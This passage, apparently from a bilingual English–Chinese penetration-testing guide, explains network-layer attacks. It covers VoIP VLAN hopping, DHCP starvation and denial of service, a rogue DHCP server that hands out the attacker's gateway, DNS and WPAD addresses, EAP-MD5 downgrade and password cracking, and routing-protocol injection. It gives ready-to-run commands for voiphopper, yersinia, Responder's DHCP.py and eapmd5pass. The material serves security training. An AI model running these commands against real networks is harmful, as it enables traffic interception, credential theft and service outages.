VoIP电话越来越多地与物联网设备集成，提供诸如通过特殊电话号码解锁门或控制恒温器等功能。但是，这种集成可能会带来安全风险。

The tool [**voiphopper**](http://voiphopper.sourceforge.net/) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.  
voiphopper 工具旨在模拟各种环境（思科、Avaya、北电、阿尔卡特朗讯）中的 VoIP 电话。它使用 CDP、DHCP、LLDP-MED 和 802.1Q ARP 等协议发现语音网络的 VLAN ID。

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):  
VoIP Hopper 为 Cisco 发现协议 （CDP） 提供三种模式：

1. **Sniff Mode** (`-c 0`): Analyzes network packets to identify the VLAN ID.  
    嗅探模式 （ `-c 0` ）：分析网络数据包以识别 VLAN ID。
    
2. **Spoof Mode** (`-c 1`): Generates custom packets mimicking those of an actual VoIP device.  
    欺骗模式 （ `-c 1` ）：生成模仿实际 VoIP 设备的自定义数据包。
    
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Sends packets identical to those of a specific Cisco IP phone model.  
    使用预制数据包模式（ `-c 2` 进行欺骗 ：发送与特定 Cisco IP 电话型号相同的数据包。
    

The preferred mode for speed is the third one. It requires specifying:  
速度的首选模式是第三种模式。它需要指定：

- The attacker's network interface (`-i` parameter).  
    攻击者的网络接口（ `-i` 参数）。
    
- The name of the VoIP device being emulated (`-E` parameter), adhering to the Cisco naming format (e.g., SEP followed by a MAC address).  
    要模拟的VoIP设备的名称（ `-E` 参数），遵循Cisco命名格式（例如，SEP后跟MAC地址）。
    

In corporate settings, to mimic an existing VoIP device, one might:  
在公司环境中，要模拟现有的VoIP设备，可以：

- Inspect the MAC label on the phone.  
    检查手机上的MAC标签。
    
- Navigate the phone's display settings to view model information.  
    浏览手机的显示设置以查看型号信息。
    
- Connect the VoIP device to a laptop and observe CDP requests using Wireshark.  
    将 VoIP 设备连接到笔记本电脑并使用 Wireshark 观察 CDP 请求。
    

An example command to execute the tool in the third mode would be:  
在第三种模式下执行该工具的示例命令为：

Copy 复制

```
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#dhcp-attacks)

DHCP Attacks DHCP 攻击

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#enumeration)

Enumeration 列举

Copy 复制

```
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```

**DoS**

**Two types of DoS** could be performed against DHCP servers. The first one consists on **simulate enough fake hosts to use all the possible IP addresses**. This attack will work only if you can see the responses of the DHCP server and complete the protocol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). For example, this is **not possible in Wifi networks**.  
可以对DHCP服务器执行两种类型的DoS。第一个包括模拟足够多的假主机以使用所有可能的 IP 地址。 仅当您可以看到DHCP服务器的响应并完成协议（发现（Comp）-->Offer（服务器）-->请求（Comp）-->ACK（服务器）时，此攻击才会起作用。例如，这在 Wifi 网络中是不可能的。

Another way to perform a DHCP DoS is to send a **DHCP-RELEASE packet using as source code every possible IP**. Then, the server will think that everybody has finished using the IP.  
执行 DHCP DoS 的另一种方法是使用每个可能的 IP 作为源代码发送 DHCP-RELEASE 数据包。然后，服务器会认为每个人都已经完成了 IP 的使用。

Copy 复制

```
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```

A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)  
一种更自动的方法是使用 DHCPing 工具

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **you can server malicious values mentioned in the next attack**.  
您可以使用上述 DoS 攻击来强制客户端在环境中获取新租约，并耗尽合法服务器，使其无响应。因此，当合法尝试重新连接时，您可以服务器在下一次攻击中提到的恶意值。

#### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#set-malicious-values)

Set malicious values 设置恶意值

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. This is useful for network attacks, like capturing HTTP traffic and credentials, by redirecting traffic to a malicious server. However, setting a rogue gateway is less effective since it only allows capturing outbound traffic from the client, missing the responses from the real gateway. Instead, setting up a rogue DNS or WPAD server is recommended for a more effective attack.  
可以使用位于 `/usr/share/responder/DHCP.py` 的 DHCP 脚本设置恶意 DHCP 服务器。这对于网络攻击非常有用，例如通过将流量重定向到恶意服务器来捕获 HTTP 流量和凭据。但是，设置恶意网关的效果较差，因为它只允许从客户端捕获出站流量，而忽略了来自真实网关的响应。相反，建议设置恶意 DNS 或 WPAD 服务器以获得更有效的攻击。

Below are the command options for configuring the rogue DHCP server:  
以下是用于配置恶意 DHCP 服务器的命令选项：

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.  
    我们的 IP 地址（网关通告）：使用 `-i 10.0.0.100` 将您计算机的 IP 通告为网关。
    
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.  
    本地DNS域名：可选使用 `-d example.org` 设置本地DNS域名。
    
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.  
    原始路由器/网关 IP：使用 `-r 10.0.0.1` 指定合法路由器或网关的 IP 地址。
    
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.  
    主 DNS 服务器 IP：使用 `-p 10.0.0.100` 设置您控制的恶意 DNS 服务器的 IP 地址。
    
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.  
    辅助 DNS 服务器 IP：（可选）使用 `-s 10.0.0.1` 设置辅助 DNS 服务器 IP。
    
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.  
    本地网络的网络掩码：使用 `-n 255.255.255.0` 定义本地网络的网络掩码。
    
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.  
    DHCP 流量接口：使用 `-I eth1` 侦听特定网络接口上的 DHCP 流量。
    
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.  
    WPAD配置地址：使用 `-w “http://10.0.0.100/wpad.dat”` 设置WPAD配置地址，协助拦截Web流量。
    
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.  
    欺骗默认网关 IP：包括 `-S` 以欺骗默认网关 IP 地址。
    
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.  
    响应所有 DHCP 请求：包括 `-R` 以使服务器响应所有 DHCP 请求，但请注意这是嘈杂的，可以检测到。
    

By correctly using these options, a rogue DHCP server can be established to intercept network traffic effectively.  
通过正确使用这些选项，可以建立恶意 DHCP 服务器以有效地拦截网络流量。

Copy 复制

```
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#eap-attacks)

**EAP Attacks EAP 攻击**

Here are some of the attack tactics that can be used against 802.1X implementations:  
以下是一些可用于针对 802.1X 实现的攻击策略：

- Active brute-force password grinding via EAP  
    通过 EAP 进行主动暴力破解密码研磨
    
- Attacking the RADIUS server with malformed EAP content _**_(exploits)  
    使用格式错误的 EAP 内容攻击 RADIUS 服务器 **（漏洞）
    
- EAP message capture and offline password cracking (EAP-MD5 and PEAP)  
    EAP 消息捕获和离线密码破解（EAP-MD5 和 PEAP）
    
- Forcing EAP-MD5 authentication to bypass TLS certificate validation  
    强制 EAP-MD5 身份验证绕过 TLS 证书验证
    
- Injecting malicious network traffic upon authenticating using a hub or similar  
    使用集线器或类似机构进行身份验证时注入恶意网络流量
    

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:  
如果攻击者在受害者和身份验证服务器之间，他可以尝试将身份验证协议降级（如有必要）为 EAP-MD5 并捕获身份验证尝试。然后，他可以使用以下方法对此进行暴力破解：

Copy 复制

```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#id-6196)

FHRP (GLBP & HSRP) Attacks FHRP （GLBP & HSRP） 攻击

**FHRP** (First Hop Redundancy Protocol) is a class of network protocols designed to **create a hot redundant routing system**. With FHRP, physical routers can be combined into a single logical device, which increases fault tolerance and helps distribute the load.  
FHRP（第一跳冗余协议）是一类网络协议，旨在创建热冗余路由系统。借助 FHRP，可以将物理路由器组合成单个逻辑设备，从而提高容错能力并有助于分配负载。

**Cisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.  
思科系统工程师开发了两种FHRP协议，GLBP和HSRP。**

[PAGE 页GLBP & HSRP Attacks GLBP 和 HSRP 攻击](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/glbp-and-hsrp-attacks)

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#rip)

RIP 把

Three versions of the Routing Information Protocol (RIP) are known to exist: RIP, RIPv2, and RIPng. Datagrams are sent to peers via port 520 using UDP by RIP and RIPv2, whereas datagrams are broadcasted to UDP port 521 via IPv6 multicast by RIPng. Support for MD5 authentication was introduced by RIPv2. On the other hand, native authentication is not incorporated by RIPng; instead, reliance is placed on optional IPsec AH and ESP headers within IPv6.  
已知存在三种版本的路由信息协议 （RIP）：RIP、RIPv2 和 RIPng。数据报通过端口 520 通过 RIP 和 RIPv2 的 UDP 发送到对等体，而数据报则通过 RIPng 的 IPv6 组播广播到 UDP 端口 521。RIPv2 引入了对 MD5 身份验证的支持。另一方面，RIPng 未合并本机身份验证;相反，依赖于 IPv6 中的可选 IPsec AH 和 ESP 标头。

- **RIP and RIPv2:** Communication is done through UDP datagrams on port 520.  
    RIP 和 RIPv2：通信通过端口 520 上的 UDP 数据报完成。
    
- **RIPng:** Utilizes UDP port 521 for broadcasting datagrams via IPv6 multicast.  
    RIPng：利用 UDP 端口 521 通过 IPv6 组播广播数据报。
    

Note that RIPv2 supports MD5 authentication while RIPng does not include native authentication, relying on IPsec AH and ESP headers in IPv6.  
请注意，RIPv2 支持 MD5 身份验证，而 RIPng 不包括本机身份验证，依赖于 IPv6 中的 IPsec AH 和 ESP 标头。

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#eigrp-attacks)

EIGRP Attacks EIGRP攻击

**EIGRP (Enhanced Interior Gateway Routing Protocol)** is a dynamic routing protocol. **It is a distance-vector protocol.** If there is **no authentication** and configuration of passive interfaces, an **intruder** can interfere with EIGRP routing and cause **routing tables poisoning**. Moreover, EIGRP network (in other words, autonomous system) **is flat and has no segmentation into any zones**. If an **attacker injects a route**, it is likely that this route will **spread** throughout the autonomous EIGRP system.  
EIGRP（增强型内部网关路由协议）是一种动态路由协议。 它是一种距离矢量协议。 如果没有身份验证和被动接口配置，入侵者可能会干扰 EIGRP 路由并导致路由表中毒。此外，EIGRP网络（换句话说，自治系统）是扁平的，没有分割到任何区域。如果攻击者注入路由，则该路由很可能会传播到整个自治 EIGRP 系统。

To attack a EIGRP system requires **establishing a neighbourhood with a legitimate EIGRP route**r, which opens up a lot of possibilities, from basic reconnaissance to various injections.  
要攻击EIGRP系统，需要建立一个具有合法EIGRP路由器的社区，这开辟了从基本侦察到各种注入的许多可能性。

[**FRRouting**](https://frrouting.org/) allows you to implement **a virtual router that supports BGP, OSPF, EIGRP, RIP and other protocols.** All you need to do is deploy it on your attacker’s system and you can actually pretend to be a legitimate router in the routing domain.  
FRRouting允许您实现支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器。 您需要做的就是将其部署在攻击者的系统上，您实际上可以假装是路由域中的合法路由器。

[PAGE 页EIGRP Attacks EIGRP攻击](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/eigrp-attacks)

[**Coly**](https://code.google.com/p/coly/) has capabilities for intercepting EIGRP (Enhanced Interior Gateway Routing Protocol) broadcasts. It also allows for the injection of packets, which can be utilized to alter routing configurations.  
Coly 具有拦截 EIGRP（增强型内部网关路由协议）广播的能力。它还允许注入数据包，可用于更改路由配置。

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#ospf)

OSPF OSPF的

In Open Shortest Path First (OSPF) protocol **MD5 authentication is commonly employed to ensure secure communication between routers**. However, this security measure can be compromised using tools like Loki and John the Ripper. These tools are capable of capturing and cracking MD5 hashes, exposing the authentication key. Once this key is obtained, it can be used to introduce new routing information. To configure the route parameters and establish the compromised key, the _Injection_ and _Connection_ tabs are utilized, respectively.  
在开放最短路径优先 （OSPF） 协议中，通常使用 MD5 身份验证来确保路由器之间的安全通信。但是，使用Loki和John the Ripper等工具可能会破坏这种安全措施。这些工具能够捕获和破解 MD5 哈希，从而公开身份验证密钥。获取此密钥后，可用于引入新的路由信息。要配置路由参数并建立泄露的密钥，将分别使用“注入”和“连接”选项卡。

- **Capturing and Cracking MD5 Hashes:** Tools such as Loki and John the Ripper are used for this purpose.  
    捕获和破解 MD5 哈希：Loki 和 John the Ripper 等工具用于此目的。
    
- **Configuring Route Parameters:** This is done through the _Injection_ tab.  
    配置路由参数：这是通过“注入”选项卡完成的。
    
- **Setting the Compromised Key:** The key is configured under the _Connection_ tab.  
    设置泄露密钥：密钥在“连接”选项卡下配置。
    

### 

[](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#other-generic-tools-and-sources)

Other Generic Tools & Sources 其他通用工具和来源

- [**Above**](https://github.com/c4s73r/Above): Tool to scan network traffic and find vulnerabilities  
    上图：用于扫描网络流量和查找漏洞的工具
    
- You can find some **more information about network attacks** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).  
    您可以在此处找到有关网络攻击的更多信息。